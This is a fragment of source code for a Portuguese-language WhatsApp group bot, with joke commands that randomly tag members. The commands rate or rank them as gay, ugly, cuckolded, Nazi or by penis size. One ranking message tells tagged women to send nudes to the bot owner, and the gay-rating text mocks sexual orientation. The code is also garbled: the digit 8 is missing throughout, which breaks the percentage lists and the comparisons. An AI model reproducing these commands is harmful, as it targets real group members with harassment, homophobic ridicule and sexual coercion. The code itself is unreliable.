const suamae211 = groupMembers
const teupai111 = suamae111[Math.floor(Math.random() * suamae111.length)]
const teupai211 = suamae211[Math.floor(Math.random() * suamae211.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shiptedd = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1 = @${teupai111.id.split('@')[0]}\n && 2 = ${teks} com uma porcentagem de: ${shiptedd}`
membrr.push(teupai111.id)
membrr.push(teupai211.id)
mentions(jet, membrr, true)
break

case 'casal':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1= @${teupai11.id.split('@')[0]}\ne esse\n2= @${teupai21.id.split('@')[0]}\ncom uma porcentagem de: ${shipted}`
membr.push(teupai11.id)
membr.push(teupai21.id)
mentions(jet, membr, true)
break

case 'alma-gemeas':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const suamae121 = groupMembers
const suamae251 = groupMembers
const teupai117 = suamae121[Math.floor(Math.random() * suamae121.length)]
const teupai251 = suamae251[Math.floor(Math.random() * suamae251.length)]
var shipted11 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipteddd = shipted11[Math.floor(Math.random() * shipted11.length)]
jet = `*Hmmm....  alma-gemeas eles 2 💘💘*\n\n1= @${teupai117.id.split('@')[0]}\ne esse\n2= @${teupai251.id.split('@')[0]}\ncom uma porcentagem de: ${shipteddd}`
membr.push(teupai117.id)
membr.push(teupai251.id)
mentions(jet, membr, true)
break


case 'gay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

aqua.sendMessage(from, {text: `❰ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggay}`)
zxzz = 
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = 'hmm... você é hetero😔'} else if (boiola == 21 ) {var bo = '+/- boiola'} else if (boiola == 23 ) {var bo = '+/- boiola'} else if (boiola == 24 ) {var bo = '+/- boiola'} else if (boiola == 25 ) {var bo = '+/- boiola'} else if (boiola == 26 ) {var bo = '+/- boiola'} else if (boiola == 27 ) {var bo = '+/- boiola'} else if (boiola == 2 ) {var bo = '+/- boiola'} else if (boiola == 29 ) {var bo = '+/- boiola'} else if (boiola == 30 ) {var bo = '+/- boiola'} else if (boiola == 31 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 35 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 3 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 41 ) {var bo = 'você é né?😏'} else if (boiola == 42 ) {var bo = 'você é né?😏'} else if (boiola == 43 ) {var bo = 'você é né?😏'} else if (boiola == 44 ) {var bo = 'você é né?😏'} else if (boiola == 45 ) {var bo = 'você é né?😏'} else if (boiola == 46 ) {var bo = 'você é né?😏'} else if (boiola == 47 ) {var bo = 'você é né?😏'} else if (boiola == 4 ) {var bo = 'você é né?😏'} else if (boiola == 49 ) {var bo = 'você é né?😏'} else if (boiola == 50 ) {var bo = 'você é ou não?🧐'} else if (boiola > 51) {var bo = 'você é gay🙈'
}
await aqua.sendMessage(from, {image: wew, caption: `  O quanto você é gay? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gay 🏳️‍🌈\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: selo})
}, 7000)
break

case 'feio':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

aqua.sendMessage(from, {text: `❰ Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgfeio}`)
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = 'É não é feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda tá na média'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = 'É fein, mas tem baum coração'} else if (feio == 35 ) {var bo = 'Tá na média, mas não deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas é feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e preguiçoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas não existe gente feia, existe gente que não conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'você é Feio, mas é legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que não resolva 🥴'} else if (feio == 43 ) {var bo = 'Feio que dói de ver, compra uma máscara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeça não resolva né!?'} else if (feio == 45 ) {var bo = 'você é feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem lábia pra pegar várias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda não sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'você é Feio, mas não se encherga 🧐'} else if (feio > 51) {var bo = 'você é Feio demais 🙈'} 

await aqua.sendMessage(from, {image: wew, caption: `  O quanto você é feio? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ feio 🙉\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: selo})
}, 7000)
break 

case 'matar':
case 'mata':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer matar')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de matar o(a) @${mentioned[0].split('@')[0]} 😈👹` 
jrpp = await getBuffer(`${matarcmd}`)
await aqua.sendMessage(from, {video: jrpp, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: selo})
break 

case 'corno':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:` ❰ Pesquisando a ficha de corno : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
setTimeout(async() => {
wew = await getBuffer(`${imgcorno}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: ` O quanto você é corno? \n\n 「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  corno 🐃`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break


case 'vesgo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:`❰ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgvesgo}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: `O quanto você é vesgo? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  Vesgo 🙄😆`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break 

case 'bebado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:`❰ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgbebado}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption:`O quanto você é bebado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ Bêbado 🤢🥵🥴`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break 

case 'gado':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:`❰ Pesquisando a ficha de gado : @${blamention_id.split("@")[0]}, aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggado}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: `O quanto você é gado? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  gado 🐂`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:` ❰ Pesquisando a sua ficha de gostoso : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostoso}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: `O quanto você é gostoso? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostoso 😝`, gifPlayback: true, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text:`❰ Pesquisando a sua ficha de gostosa : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggostosa}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: `O quanto você é gostosa? 😏\n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱ gostosa 😳`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break


case 'nazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
aqua.sendMessage(from, {text: ` ❰ Pesquisando a sua ficha de nazista : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imgnazista}`)
random = `${Math.floor(Math.random() * 110)}`
await aqua.sendMessage(from, {image: wew, caption: `O quanto você é nazista? \n\n「 @${blamention_id.split("@")[0]} 」Você é: ❰ ${random}% ❱  nazista 卐`, mentions: [blamention_id]}, {quoted: selo})
}, 7000)
break 

case 'beijo':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('Marque alguém que vc quer da um beijo')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você deu um beijo gostoso na(o) @${mentioned[0].split('@')[0]} 😁👉👈❤` 
wew = await getBuffer(`${beijocmd}`)
await aqua.sendMessage(from, {video: wew, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: selo})
break

case 'tapa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o tapa')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um tapa na raba da😏 @${mentioned[0].split('@')[0]} 🔥` 
jrq = await getBuffer(`${tapacmd}`)
await aqua.sendMessage(from, {video: jrq, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: selo})
break

case 'chute':
case 'chutar':  
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá um chute')
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Você Acabou de da um chute em @${mentioned[0].split('@')[0]} 🤡` 
jry = await getBuffer(`${chutecmd}`)
await aqua.sendMessage(from, {video: jry, gifPlayback: true, caption: susp, mentions: mentioned}, {quoted: selo})
break 

case 'dogolpe':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if (args.length < 1) return await aqua.sendMessage(from, {text: 'coloca um nome'}, {quoted: selo})
pkt = body.slice(9)
mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
random = `${Math.floor(Math.random() * 100)}`
jpr = `*GOLPISTA ENCONTRADO👉🏻*\n\n*GOLPISTA* : *${args[0]}*\n*PORCENTAGEM DO GOLPE* : ${random}%😂\n\nEle(a) gosta de ferir sentimentos 😢`
aqua.sendMessage(from, {text: jpr, mentions: mentioned})
break


case 'rankgay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
d = []
ret = '🏳️‍🌈 Rank dos mais gays\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🏳️‍🌈❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankgado':
case 'rankgados':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
d = []
ret = '🐂🐂 Rank dos mais gados do grupo \n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
ret += `🐂❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(ret, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankcorno':
case 'rankcornos':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const corno1 = groupMembers
const corno2 = groupMembers
const corno3 = groupMembers
const corno4 = groupMembers
const corno5 = groupMembers
const cornos1 = corno1[Math.floor(Math.random() * corno1.length)]
const cornos2 = corno2[Math.floor(Math.random() * corno2.length)]
const cornos3 = corno3[Math.floor(Math.random() * corno3.length)]
const cornos4 = corno4[Math.floor(Math.random() * corno4.length)]
const cornos5 = corno5[Math.floor(Math.random() * corno5.length)]
var porcentagemcorno = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `O chifre desse ai bate na lua ksksksk`]
const porcentagemc = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcentag = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcent = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porcl = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const porg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
const prg = porcentagemcorno[Math.floor(Math.random() * porcentagemcorno.length)]
ytb = `
Esses são os cornos do grupo ${groupName}\n@${cornos1.id.split('@')[0]}\nCom uma porcentagem de ${porcent}\n@${cornos2.id.split('@')[0]}\nCom uma porcentagem de ${porcentag}\n@${cornos3.id.split('@')[0]}\nCom uma porcentagem de ${porcl}\n@${cornos4.id.split('@')[0]}\nCom uma porcentagem de ${porg}\n@${cornos5.id.split('@')[0]}\nCom uma porcentagem de ${prg}\n\n⚡${NomeDoBot} ⚡`
membr.push(cornos1.id)
membr.push(cornos2.id)
membr.push(cornos3.id)
membr.push(cornos4.id)
membr.push(cornos5.id)
mentions(ytb, membr, true)
break

case 'rankgostosos':
case 'rankgostoso':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
member = []
const p01 = groupMembers
const p02 = groupMembers
const p03 = groupMembers
const p04 = groupMembers
const p05 = groupMembers
const o01 = p01[Math.floor(Math.random() * p01.length)]
const o02 = p02[Math.floor(Math.random() * p02.length)]
const o03 = p03[Math.floor(Math.random() * p03.length)]
const o04 = p04[Math.floor(Math.random() * p04.length)]
const o05 = p05[Math.floor(Math.random() * p05.length)]
luy = `
Parados!🤚🤚\n\n1=🤚🤭@${o01.id.split('@')[0]}🤚🤭\n\n\n2=🤚??@${o02.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o03.id.split('@')[0]}🤚🤭\n\n\n4=????@${o04.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o05.id.split('@')[0]}🤚🤭\n\n\nMulta por serem gostosos dms😳 pague pena trabalhando em nossa agência de modelos 😊 by: ${NomeDoBot}`
member.push(o01.id)
member.push(o02.id)
member.push(o03.id)
member.push(o04.id)
member.push(o05.id)
mentions(luy, member, true)
break

case 'rankgostosas':
case 'rankgostosa':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
member = []
const p1 = groupMembers
const p2 = groupMembers
const p3 = groupMembers
const p4 = groupMembers
const p5 = groupMembers
const o1 = p1[Math.floor(Math.random() * p1.length)]
const o2 = p2[Math.floor(Math.random() * p2.length)]
const o3 = p3[Math.floor(Math.random() * p3.length)]
const o4 = p4[Math.floor(Math.random() * p4.length)]
const o5 = p5[Math.floor(Math.random() * p5.length)]
luy = `
Paradas!🤚🤚\n\n1=🤚🤭@${o1.id.split('@')[0]}🤚🤭\n\n\n2=🤚🤭@${o2.id.split('@')[0]}🤚🤭\n\n\n3=🤚🤭@${o3.id.split('@')[0]}🤚🤭\n\n\n4=🤚🤭@${o4.id.split('@')[0]}🤚🤭\n\n\n5=🤚🤭@${o5.id.split('@')[0]}🤚🤭\n\n\nMultas por serem gostosas dms😳 pague pena enviando nud no PV do dono😊 by Bot`
member.push(o1.id)
member.push(o2.id)
member.push(o3.id)
member.push(o4.id)
member.push(o5.id)
mentions(luy, member, true)
break

case 'ranknazista':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

try{
if(!isGroup) return reply(enviar.msg.grupo)
d = []
teks = '💂‍♂️Rank dos mais nazistas do gp\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `💂‍♂️❧ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
break

case 'rankotakus':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

membr = []
const otaku1 = groupMembers
const otaku2 = groupMembers
const otaku3 = groupMembers
const otaku4 = groupMembers
const otaku5 = groupMembers
const otaku6 = groupMembers
const otaku7 = groupMembers
const otaku = groupMembers
const otaku9 = groupMembers
const otaku10 = groupMembers
const otakus1 = otaku1[Math.floor(Math.random() * otaku1.length)]
const otakus2 = otaku2[Math.floor(Math.random() * otaku2.length)]
const otakus3 = otaku3[Math.floor(Math.random() * otaku3.length)]
const otakus4 = otaku4[Math.floor(Math.random() * otaku4.length)]
const otakus5 = otaku5[Math.floor(Math.random() * otaku5.length)]
const otakus6 = otaku6[Math.floor(Math.random() * otaku6.length)]
const otakus7 = otaku7[Math.floor(Math.random() * otaku7.length)]
const otakus = otaku[Math.floor(Math.random() * otaku.length)]
const otakus9 = otaku9[Math.floor(Math.random() * otaku9.length)]
const otakus10 = otaku10[Math.floor(Math.random() * otaku10.length)]
ytb = `esses são os otakus fedidos do grupo\n@${otakus1.id.split('@')[0]}\n@${otakus2.id.split('@')[0]}\n@${otakus3.id.split('@')[0]}\n@${otakus4.id.split('@')[0]}\n@${otakus5.id.split('@')[0]}\n@${otakus6.id.split('@')[0]}\n@${otakus7.id.split('@')[0]}\n@${otakus.id.split('@')[0]}\n@${otakus9.id.split('@')[0]}\n@${otakus10.id.split('@')[0]}\n\n⚡${NomeDoBot} ⚡`
membr.push(otakus1.id)
membr.push(otakus2.id)
membr.push(otakus3.id)
membr.push(otakus4.id)
membr.push(otakus5.id)
membr.push(otakus6.id)
membr.push(otakus7.id)
membr.push(otakus.id)
membr.push(otakus9.id)
membr.push(otakus10.id)
mentions(ytb, membr, true)
break

case 'rankpau':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

membr = []
const pauz1 = groupMembers
const pauz2 = groupMembers
const pauz3 = groupMembers
const pauz4 = groupMembers
const pauz5 = groupMembers
const paus1 = pauz1[Math.floor(Math.random() * pauz1.length)]
const paus2 = pauz2[Math.floor(Math.random() * pauz2.length)]
const paus3 = pauz3[Math.floor(Math.random() * pauz3.length)]
const paus4 = pauz4[Math.floor(Math.random() * pauz4.length)]
const paus5 = pauz5[Math.floor(Math.random() * pauz5.length)]
var pcpau1 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau2 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau3 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau4 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
var pcpau5 = ["Minuscúlo", `Pequenino`, `Pequeno`, `Médio`, `Grandinho`, `Grande`, `Grandão`, `Gigante`, `Gigantesco`, `Enorme`, `BATENDO NA LUA`, `QUEIMADO, TÃO GRANDE QUE BATEU NO SOL E QUEIMOU ksksksk`]
const pc1 = pcpau1[Math.floor(Math.random() * pcpau1.length)]
const pc2 = pcpau2[Math.floor(Math.random() * pcpau2.length)]
const pc3 = pcpau3[Math.floor(Math.random() * pcpau3.length)]
const pc4 = pcpau4[Math.floor(Math.random() * pcpau4.length)]
const pc5 = pcpau5[Math.floor(Math.random() * pcpau5.length)]
pdr = `Esses são os caras com o menor e maior pau do Grupo\n${groupName}\n\n@${paus1.id.split('@')[0]}\n${pc1}\n@${paus2.id.split('@')[0]}\n${pc2}\n@${paus3.id.split('@')[0]}\n${pc3}\n@${paus4.id.split('@')[0]}\n${pc4}\n@${paus5.id.split('@')[0]}\n${pc5}\n\n${NomeDoBot}`
membr.push(paus1.id)
membr.push(paus2.id)
membr.push(paus3.id)
membr.push(paus4.id)
membr.push(paus5.id)
mentions(pdr, membr, true)
break 

//========FINAL DOS JOGOS=============

//==========(COMANDOS DE ALTERAÇÃO DE ÁUDIO)===========\\

case 'tupai':
if (!isQuotedAudio) return reply('Marque um áudio')
reply(enviar.espere)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.5,asetrate=65100"' ${ran}`, (err, stderr, stdout) => {
